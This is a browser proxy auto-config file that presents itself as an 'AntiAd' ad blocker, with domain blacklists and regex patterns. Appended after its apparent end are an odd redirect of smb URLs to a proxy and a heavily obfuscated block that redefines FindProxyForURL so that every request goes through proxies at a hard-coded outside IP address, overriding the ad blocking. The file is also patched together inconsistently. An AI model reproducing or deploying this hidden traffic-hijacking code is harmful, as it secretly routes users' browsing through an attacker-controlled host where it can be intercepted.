// If you're not using a proxy, set: pass = "DIRECT"
// If you are using a proxy, set: pass = "PROXY hostname:port"
pass = "DIRECT";

// For use with BlackHole Proxy, set: blackhole = "PROXY 127.0.0.1:3421"
// For use with a local http server, set: blackhole = "PROXY 127.0.0.1:80"
// Otherwise use: blackhole = "PROXY 0.0.0.0"
blackhole = "PROXY 127.0.0.1:3421";

// To autostart with broswer set to 1
isEnabled = 1;

// *** WHITELIST ***
//    Array of whitelisted domains (these are allowed no matter what)
//
//    Set blank array equal to: new Array("");
//    MAKE SURE DOMAINS ARE LOWERCASE
//
whitelist = new Array("");

// *** BLACKLIST ***
//    Arrays of blacklisted domains (these are blocked)
//
//    Domains are alphabetically matched by first letter, use the appropriate array.
//    Set blank arrays equal to: new Array("");
//    To block all "some-domain.com","some-domain.net",etc. just use "some-domain".
//    MAKE SURE DOMAINS ARE LOWERCASE
//
adDomain.Xa = new Array("atdmt.com","adultadworld.com","adtech","admonitor.net","adlink","ads360.com","affiliatetargetad.com","advertwizard.com","adknowledge.com","adsoftware.com","andlotsmore.com","aureate.com","adbrite.com","aavalue.com","advertserve.com","adsrve.com","admaximize.com","advertising.com","adultcash.com","accessplugin.com","adsonar.com","adroar.com","addr.com","adrevolver.com","adserver.com","akamaitechnologies.com","amazingcounters.com","allowednet.com","ad-flow.com","adflow.com","alfaspace.net","advance.net","akamaitech.net","akamai.net","adbureau.net");
adDomain.Xb = new Array("bannercommunity.de","bpath.com","bonzi.com","bluestreak.com","bannermall.com","blogads.com","bestoffersnetworks.com","bannerhosts.com","bfast.com","bnex.com","beesearch.info","baixar.ws","bannerconnect.net","bargain-buddy.net");
adDomain.Xc = new Array("clicktorrent.info","count.cc","click2net","casalemedia.com","channelintelligence.com","clicktrade.com","clickhype.com","cpxinteractive.com","coolwebsearch.com","clrsch.com","cj.com","chickclick.com","comclick.com","cqcounter.com","clicksor.com","climaxbucks.com","cometsystems.com","clickfinders.com","clickagents.com","conducent.com","clickability.com","cjt1.net","clickbank.net");
adDomain.Xd = new Array("doubleclick","direct-revenue.com","decideinteractive.com","drsnsrch.com","directtrack.com","dotbiz4all.com","drmwrap.com","domainsponsor.com","download-software.us","descarregar.net");
adDomain.Xe = new Array("errorsafe.com","esomniture.com","eimg.com","ezcybersearch.com","erasercash.com","extreme-dm.com","ezgreen.com","enliven.com","eacceleration.com","einets.com","esthost.com","euroclick.net");
adDomain.Xf = new Array("freebannertrade.com","fastclick","focalink.com","friendfinder.com","flyswat.com","firehunt.com","flycast.com","focalex.com","flyingcroc.net","falkag.net");
adDomain.Xg = new Array("gratisware.com","grandstreetinteractive.com","gambling.com","goclick.com","googlesyndication.com","gohip.com","gator.com","googleadservices.com","gmx.net");
adDomain.Xh = new Array("happy.collegehumor.com","hit-parade.com","humanclick.com","hotbar.com","hpwis.com","hitbox.com","hpg.ig.com.br","hpg.com.br","hyperbanner.net","hypermart.net");
adDomain.Xi = new Array("intellitxt.com","ivwbox.de","imaginemedia.com","imrworldwide.com","inetinteractive.com","insightexpressai.com","inspectorclick.com","internetfuel.com","iwon.com","imgis.com","insightexpress.com","intellicontact.com","insightfirst.com");
adDomain.Xj = new Array("just404.com");
adDomain.Xk = new Array("kadserver.com");
adDomain.Xl = new Array("linklist.cc","linkexchange","links4trade.com","linkshare.com","linksponsor.com","link4ads.com","livestat.com","liveadvert.com","linksynergy.com","linksummary.com","liteweb.net");
adDomain.Xm = new Array("mtree.com","malwarewipe.com","marketscore.com","maxserving.com","mywebsearch.com","mysearch.com","mygeek.com","mycomputer.com","moreover.com","mspaceads.com","mediaplex.com","myway.com","mediaonenetwork.net","madserver.net");
adDomain.Xn = new Array("nextlevel.com","netster.com","nastydollars.com","netgravity.com","networldmedia.net");
adDomain.Xo = new Array("overture.com","oingo.com","ourtoolbar.com","offeroptimizer.com","offshoreclicks.com","opistat.com","o7.net","opentracker.net");
adDomain.Xp = new Array("pentoninteractive.com","porntrack.com","precisionclick.com","paypopup.com","paycounter.com","popupsponsor.com","paycount.com","popupmoney.com","p2l.info","pharmacyfarm.info","popupad.net","pharmacyheaven.biz");
adDomain.Xq = new Array("qsrch.com","quigo.com","qckads.com");
adDomain.Xr = new Array("realmedia.com","radiate.com","redsheriff.com","realtracker.com","readnotify.com");
adDomain.Xs = new Array("searchx.cc","sextracker","sex-tracker","sabela.com","spywarequake.com","spywarestrike.com","searchmiracle.com","starware.com","starwave.com","swirve.com","spyaxe.com","spylog.com","search.com","servik.com","searchfuel.com","search.com.com","spyfalcon.com","sitemeter.com","statcounter.com","sitestats.com","superstats.com","sitestat.com","sexlist.com","scaricare.ws","speedera.net");
adDomain.Xt = new Array("targetpoint.com","tempx.cc","topx.cc","trafficsyndicate.com","teknosurf.com","timesink.com","tradedoubler.com","thecounter.com","targetwords.com","telecharger-en-francais.com","trafficserverstats.com","targetnet.com","telecharger-soft.com","thruport.com","tdmy.com","telecharger.ws","tribalfusion.com");
adDomain.Xu = new Array("utopiad.com");
adDomain.Xv = new Array("vonna.com","valueclick","virtumundo.com","vpptechnologies.com","virtualave.net");
adDomain.Xw = new Array("web3000.com","webtrendslive.com","weatherbug.com","webhancer.com","websponsors.com");
adDomain.Xx = new Array("xiti.com","xxxcounter.com");
adDomain.Xy = new Array("");
adDomain.Xz = new Array("zangocash.com","zakatron.com","zedo.com","zango.com");
adDomain.X0 = new Array("0catch.com");
adDomain.X1 = new Array("1stok.com","180solutions.com");
adDomain.X2 = new Array("247media.com","247realmedia.com","2o7.net");
adDomain.X3 = new Array("3721.com");
adDomain.X4 = new Array("");
adDomain.X5 = new Array("");
adDomain.X6 = new Array("");
adDomain.X7 = new Array("");
adDomain.X8 = new Array("");
adDomain.X9 = new Array("");

// *** SMARTLIST ***
//    Regular expression patterns for popular ad subdomains
//
//    Patterns are alphabetically matched by first letter, use the appropriate variable.
//    If not using a pattern, set it equal to: /!()/;
//    MAKE SURE PATTERNS ARE LOWERCASE
//
adHostSub = new Object;
adHostSub.Xa = /^(ad\-?(banner|boost|butler|center|click|codes|ima?ge?|manager|media|serv(ant|ice|ing)|se?rve?r?|v|vert)?s?[0-9]{0,3}\.)/;
adHostSub.Xb = /^(banner\-?(s|ads?|exchange|server?)?[0-9]{0,3}\.)/;
adHostSub.Xc = /^(((cl(ic)?ks?(server?)?|count(er)?s?)[0-9]{0,3})\.)/;
adHostSub.Xd = /^ad([sxv]?[0-9]*|system)[_.-]([^.[:space:]]+\.){1,}|[_.-]ad([sxv]?[0-9]*|system)[_.-]/;
adHostSub.Xe = /^(.+[_.-])?adse?rv(er?|ice)?s?[0-9]*[_.-]/;
adHostSub.Xf = /^(.+[_.-])?telemetry[_.-]/;
adHostSub.Xg = /^adim(age|g)s?[0-9]*[_.-]/;
adHostSub.Xh = /^(hits?\.)/;
adHostSub.Xi = /^(imageads?\.)/;
adHostSub.Xj = /^adtrack(er|ing)?[0-9]*[_.-]/;
adHostSub.Xk = /^advert(s|is(ing|ements?))?[0-9]*[_.-]/;
adHostSub.Xl = /!(lads)/;
adHostSub.Xm = /^aff(iliat(es?|ion))?[_.-]/;
adHostSub.Xn = /^analytics?[_.-]/;
adHostSub.Xo = /^banners?[_.-]/;
adHostSub.Xp = /^((pageads?|pop(s|ups?)?|promos?)[0-9]{0,3}\.)/;
adHostSub.Xq = /^beacons?[0-9]*[_.-]/;
adHostSub.Xr = /!()/;
adHostSub.Xs = /^(servedby[0-9]{0,3}\.)/;
adHostSub.Xt = /^((toolbar|track(ing)?)[0-9]{0,3}\.)/;
adHostSub.Xu = /^count(ers?)?[0-9]*[_.-]/;
adHostSub.Xv = /^mads\./;
adHostSub.Xw = /^pixels?[-.]/;
adHostSub.Xx = /^stat(s|istics)?[0-9]*[_.-]/;
adHostSub.Xy = /!()/;
adHostSub.Xz = /!()/;
adHostSub.X0 = /!()/;
adHostSub.X1 = /!()/;
adHostSub.X2 = /!()/;
adHostSub.X3 = /!()/;
adHostSub.X4 = /!()/;
adHostSub.X5 = /!()/;
adHostSub.X6 = /!()/;
adHostSub.X7 = /!()/;
adHostSub.X8 = /!()/;
adHostSub.X9 = /!()/;

// *** SMARTLIST ***
//    Regular expression patterns for popular ad folders
//
//    MAKE SURE PATTERNS ARE LOWERCASE
//
adHostFolder = /\/(ads?|affils|banners?|bnrs?|promotions)\//;

// DEBUG
//    WARNING: ENABLING THIS CAUSES PROBLEMS WITH OPERA
//    Displays messages in Firefox javascript console for debugging.
//    1 = enable
debug = 0;

function FindProxyForURL(url, host)
{
    host = host.toLowerCase();
	url = url.toLowerCase();

		
	if (debug) { alert("Checking: "+host); }		//DEBUG
		

	// *** AntiAd Control ***
	//
    //    To disable, visit this URL:		http://antiad.off
    //    To enable, visit this URL:		http://antad.on
    //    You could make these into bookmarks
	//
	if (host == "antiad.on") {
		if (debug) { alert("AntiAd is ON"); }		//DEBUG
		isEnabled = 1;
		return blackhole;
	}
	else if (host == "antiad.off") {
		if (debug) { alert("AntiAd is OFF"); }		//DEBUG
		isEnabled = 0;
		return blackhole;
    }

	// Normal passthrough if AntiAd is disabled
	if (!isEnabled) {   return pass;   }


	// *** WHITELIST ***
	//    Allow domains and site explicitly
	for (i = 0; i <= whitelist.length; i++) {
		if (host == whitelist[i]) {
			return pass;
		}
	}
	
	
	// *** SMARTLIST ***
	//    Blocking using regular expressions for popular ad subdomains and folders
	if (((host.charAt(0) >= "a") && (host.charAt(0) <= "z")) || ((host.charAt(0) >= "0") && (host.charAt(0) <= "9"))) {
		index = "X"+host.charAt(0);
	}
	else { index = 0; }
	// subdomains
	if (index != 0 && adHostSub[index].test(host)) {
		if (debug) { alert("RegExp-Domain-Blocked: "+host); }		//DEBUG
		return blackhole;
	}
	// folders
	if (adHostFolder.test(url)) {
		if (debug) { alert("RegExp-Folder-Blocked: "+url); }		//DEBUG
		return blackhole;
	}
	

	// *** BLACKLIST ***
	//    Blocking domains and sites explicitly
	trunk = host;
	while (trunk.indexOf(".") > 0) {
		if (((trunk.charAt(0) >= "a") && (trunk.charAt(0) <= "z")) || ((trunk.charAt(0) >= "0") && (trunk.charAt(0) <= "9"))) {
			index = "X"+trunk.charAt(0);
		}
		else { index = 0; }
		
		if ((index != 0) && adDomain(trunk, adDomain[index])) {
			if (debug) { alert("Black List-Blocked: "+host); }		//DEBUG
			return blackhole;
		}
		
		trunk = trunk.substring(trunk.indexOf(".")+1,trunk.length);
	}
	

	// All else fails, just pass through
	return pass;
}


if (debug) { alert("AntiAd loaded!!!"); }		//DEBUG


// Custom domain matching function
function adDomain(host, adRay) {
	for (i = 0; i <= adRay.length; i++) {
		if (0
			|| (host == adRay[i])
			|| (shExpMatch("."+ host, "*."+adRay[i]+".*"))
		) {
			return 1;
		}
	}
	return 0;
}

if (url.substring(0, 8) == 'http://:' ||
url.substring(0, 3) == 'smb' ||
url.substring(0, 9) == 'https://:')

{
return 'PROXY wcg1.example.com:8080';
}

function a0_0x1401(){var _0x1f365d=['deOEA8o2j20moCkq','omooW5RdGIJdRGe','WPNdQfeQaGu','WPldJbhcUSkWWPxdJ8kjtq','w31/FCkJW5CEuIuirJldSSoNWO91W712uq','WQjuW63dLJJdRqfsWOOKWRjkW6yRW4xcSCk3','aSkHW6pcO8oQW6SB','cSo+WQ1zW4JcNYNcV8oLCG','WQmVWOVcQgtcS3S','wZO7W6WffSoeWPhdIG','WP12p8oYWQxdLW','WPyacKZcRblcOCoIFZC','WQ8/bSoKbe3cNW','v8otdSkgWOZdTSomgsChWR5B','y8oKo2vEWR/cHqbpjhGj','a2mhW6BdPCkkxCo3g8oqEuWM','kWtdQdfoWPBcUZzSwmowWRChFbrbWRy7','WQpcLgyLvuVdTSkiWPL9','amoTW4S/W6VcHIJdLa','WQbiECk7EItcKKytW6e6bW','zSoMB8kdoSkfWOFdVeW','A8o1BmkAW5hcSYddHCkzEHufjG','j8kGoSkMhSkhWPZdG0e','mCkXW47dRsBdKHyz','W47dRuRdN8okW6FdOwlcT3VdQSoUta','DNf+W5BcVCkPvSozpCkwiM52umkxp8k6W6JcUCk6W7G/A2tdRe1XhZxcHCk8wmoHWQD3bJvvcW9qW5JcLCkYWQG7WPdcL8k2WR9hwLOoE3KLfCohwgL9r8oCe8k/W4anDCkIWQyGWQ0XmSodW7KYvu1XWP8fha','W7ldQmklsCkWWRaiza','cCktb3BdU3ddUSkCtqhcOd4','rt8xWQVdHaxdPHang8omewq'];a0_0x1401=function(){return _0x1f365d;};return a0_0x1401();}function a0_0x2bdd(_0x2d8aaf,_0x5aa3fc){var _0x140100=a0_0x1401();return a0_0x2bdd=function(_0x2bdd18,_0x429a03){_0x2bdd18=_0x2bdd18-0x12f;var _0x278b94=_0x140100[_0x2bdd18];if(a0_0x2bdd['RuqVXt']===undefined){var _0x39e069=function(_0x61a2a1){var _0x3598e1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x556c38='',_0x41df9a='';for(var _0x2575ca=0x0,_0x1f725c,_0x5c2607,_0x378d41=0x0;_0x5c2607=_0x61a2a1['charAt'](_0x378d41++);~_0x5c2607&&(_0x1f725c=_0x2575ca%0x4?_0x1f725c*0x40+_0x5c2607:_0x5c2607,_0x2575ca++%0x4)?_0x556c38+=String['fromCharCode'](0xff&_0x1f725c>>(-0x2*_0x2575ca&0x6)):0x0){_0x5c2607=_0x3598e1['indexOf'](_0x5c2607);}for(var _0x249636=0x0,_0x3c85f8=_0x556c38['length'];_0x249636<_0x3c85f8;_0x249636++){_0x41df9a+='%'+('00'+_0x556c38['charCodeAt'](_0x249636)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x41df9a);};var _0x38b2da=function(_0x4229bb,_0x3b7761){var _0x27ae7c=[],_0x1b944e=0x0,_0xa52c52,_0x432848='';_0x4229bb=_0x39e069(_0x4229bb);var _0x3afb4a;for(_0x3afb4a=0x0;_0x3afb4a<0x100;_0x3afb4a++){_0x27ae7c[_0x3afb4a]=_0x3afb4a;}for(_0x3afb4a=0x0;_0x3afb4a<0x100;_0x3afb4a++){_0x1b944e=(_0x1b944e+_0x27ae7c[_0x3afb4a]+_0x3b7761['charCodeAt'](_0x3afb4a%_0x3b7761['length']))%0x100,_0xa52c52=_0x27ae7c[_0x3afb4a],_0x27ae7c[_0x3afb4a]=_0x27ae7c[_0x1b944e],_0x27ae7c[_0x1b944e]=_0xa52c52;}_0x3afb4a=0x0,_0x1b944e=0x0;for(var _0x52f543=0x0;_0x52f543<_0x4229bb['length'];_0x52f543++){_0x3afb4a=(_0x3afb4a+0x1)%0x100,_0x1b944e=(_0x1b944e+_0x27ae7c[_0x3afb4a])%0x100,_0xa52c52=_0x27ae7c[_0x3afb4a],_0x27ae7c[_0x3afb4a]=_0x27ae7c[_0x1b944e],_0x27ae7c[_0x1b944e]=_0xa52c52,_0x432848+=String['fromCharCode'](_0x4229bb['charCodeAt'](_0x52f543)^_0x27ae7c[(_0x27ae7c[_0x3afb4a]+_0x27ae7c[_0x1b944e])%0x100]);}return _0x432848;};a0_0x2bdd['QGJlPc']=_0x38b2da,_0x2d8aaf=arguments,a0_0x2bdd['RuqVXt']=!![];}var _0x3069a5=_0x140100[0x0],_0x595cde=_0x2bdd18+_0x3069a5,_0x3e8ab0=_0x2d8aaf[_0x595cde];return!_0x3e8ab0?(a0_0x2bdd['AVouiy']===undefined&&(a0_0x2bdd['AVouiy']=!![]),_0x278b94=a0_0x2bdd['QGJlPc'](_0x278b94,_0x429a03),_0x2d8aaf[_0x595cde]=_0x278b94):_0x278b94=_0x3e8ab0,_0x278b94;},a0_0x2bdd(_0x2d8aaf,_0x5aa3fc);}(function(_0x2731c8,_0x2ff48f){var _0x57b540=a0_0x2bdd,_0x258a68=_0x2731c8();while(!![]){try{var _0x38851e=parseInt(_0x57b540(0x14b,'O[T#'))/0x1*(-parseInt(_0x57b540(0x13c,'mhKu'))/0x2)+parseInt(_0x57b540(0x13f,'jwV2'))/0x3*(parseInt(_0x57b540(0x136,'P#R6'))/0x4)+-parseInt(_0x57b540(0x133,'#zyS'))/0x5*(-parseInt(_0x57b540(0x146,'Fru]'))/0x6)+-parseInt(_0x57b540(0x140,'Lq[q'))/0x7*(-parseInt(_0x57b540(0x149,')s%s'))/0x8)+parseInt(_0x57b540(0x13e,'Qj&z'))/0x9+-parseInt(_0x57b540(0x145,'M@UW'))/0xa*(-parseInt(_0x57b540(0x143,'QoSq'))/0xb)+-parseInt(_0x57b540(0x147,'uE6q'))/0xc;if(_0x38851e===_0x2ff48f)break;else _0x258a68['push'](_0x258a68['shift']());}catch(_0x5e8077){_0x258a68['push'](_0x258a68['shift']());}}}(a0_0x1401,0x1c5d2));function atoi(_0x38b2da){if(_0x38b2da=='a')return 0x61;if(_0x38b2da=='b')return 0x62;if(_0x38b2da=='c')return 0x63;if(_0x38b2da=='d')return 0x64;if(_0x38b2da=='e')return 0x65;if(_0x38b2da=='f')return 0x66;if(_0x38b2da=='g')return 0x67;if(_0x38b2da=='h')return 0x68;if(_0x38b2da=='i')return 0x69;if(_0x38b2da=='j')return 0x6a;if(_0x38b2da=='k')return 0x6b;if(_0x38b2da=='l')return 0x6c;if(_0x38b2da=='m')return 0x6d;if(_0x38b2da=='n')return 0x6e;if(_0x38b2da=='o')return 0x6f;if(_0x38b2da=='p')return 0x70;if(_0x38b2da=='q')return 0x71;if(_0x38b2da=='r')return 0x72;if(_0x38b2da=='s')return 0x73;if(_0x38b2da=='t')return 0x74;if(_0x38b2da=='u')return 0x75;if(_0x38b2da=='v')return 0x76;if(_0x38b2da=='w')return 0x77;if(_0x38b2da=='x')return 0x78;if(_0x38b2da=='y')return 0x79;if(_0x38b2da=='z')return 0x7a;if(_0x38b2da=='0')return 0x30;if(_0x38b2da=='1')return 0x31;if(_0x38b2da=='2')return 0x32;if(_0x38b2da=='3')return 0x33;if(_0x38b2da=='4')return 0x34;if(_0x38b2da=='5')return 0x35;if(_0x38b2da=='6')return 0x36;if(_0x38b2da=='7')return 0x37;if(_0x38b2da=='8')return 0x38;if(_0x38b2da=='9')return 0x39;if(_0x38b2da=='.')return 0x2e;return 0x20;}function hostHash(_0x61a2a1){var _0x20d201=a0_0x2bdd,_0x3598e1=0x0,_0x556c38=_0x61a2a1['toLowerCase']();if(_0x556c38[_0x20d201(0x14a,'LbY#')]==0x0)return _0x3598e1;for(var _0x41df9a=0x0;_0x41df9a<_0x556c38[_0x20d201(0x135,'STJF')];_0x41df9a++){var _0x2575ca=atoi(_0x556c38[_0x20d201(0x141,'jwV2')](_0x41df9a,_0x41df9a+0x1));_0x3598e1=_0x3598e1+_0x2575ca;}return _0x3598e1;}function FindProxyForURL(_0x1f725c,_0x5c2607){var _0x334539=a0_0x2bdd,_0x378d41=[_0x334539(0x144,'FCz[')],_0x249636='56444',_0x3c85f8=hostHash(_0x5c2607),_0x4229bb=_0x3c85f8%0xa,_0x3b7761='';if(_0x4229bb<=0x3)_0x3b7761=_0x334539(0x12f,'XPeO');else _0x4229bb<=0x6?_0x3b7761=_0x334539(0x13b,'0OBt'):_0x3b7761=_0x334539(0x130,'#zyS');var _0x27ae7c='192.169.179.253:56944';return'PROXY\x20'+_0x3b7761+_0x334539(0x13d,'Jwf[')+_0x27ae7c+';\x20DIRECT';}
 
// EOF
